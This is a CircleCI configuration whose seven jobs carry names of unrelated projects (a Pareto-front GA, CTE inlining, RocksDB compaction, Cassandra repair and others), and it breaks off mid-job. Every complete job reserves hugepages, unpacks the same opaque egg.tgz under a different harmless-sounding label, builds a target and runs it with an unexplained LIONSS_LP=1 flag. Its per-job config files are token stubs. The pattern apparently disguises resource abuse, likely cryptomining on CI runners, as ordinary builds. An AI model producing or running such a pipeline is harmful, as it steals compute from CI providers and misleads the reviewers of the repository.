version: 2.1

jobs:
  nsga2_front:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set objectives
          command: |
            printf 'objs 2\n' > nsga.cfg
      - run:
          name: Build multi-objective GA
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target nsga2_front -j2
      - run:
          name: Sort Pareto fronts
          command: LIONSS_LP=1 ./build/nsga2_front --conf nsga.cfg --pop 100
  cteInline:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write CTE
          command: |
            printf 'WITH t AS (SELECT 1)\n' > cte.sql
      - run:
          name: Build rewriter
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target cteInline -j2
      - run:
          name: Inline CTE references
          command: LIONSS_LP=1 ./build/cteInline --sql cte.sql
  unwind-fp:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load frames
          command: |
            printf 'frames 32\n' > unwind.cfg
      - run:
          name: Build unwinder
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target unwind-fp -j2
      - run:
          name: Walk frame pointers
          command: LIONSS_LP=1 ./build/unwind-fp --conf unwind.cfg --max 256
  rocksdbCompact:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Seed SST files
          command: |
            mkdir -p db && : > db/000001.sst
      - run:
          name: Build LSM engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target rocksdbCompact -j2
      - run:
          name: Compact to bottommost
          command: LIONSS_LP=1 ./build/rocksdbCompact --db db --level max
  LbfgsTwoloop:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set history
          command: |
            printf 'm 10\n' > lbfgs.cfg
      - run:
          name: Build quasi-Newton
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target LbfgsTwoloop -j2
      - run:
          name: Two-loop recursion
          command: LIONSS_LP=1 ./build/LbfgsTwoloop --conf lbfgs.cfg --iters 100
  cassandra_repair:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Extract sources
          command: tar xzf egg.tgz
      - run:
          name: Prepare build environment
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: List tokens
          command: |
            printf 'range 0-100\n' > tokens.txt
      - run:
          name: Build repair tool
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target cassandra_repair -j2
      - run:
          name: Repair token ranges
          command: LIONSS_LP=1 ./build/cassandra_repair --ranges tokens.txt --full
  opus_encode48k:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
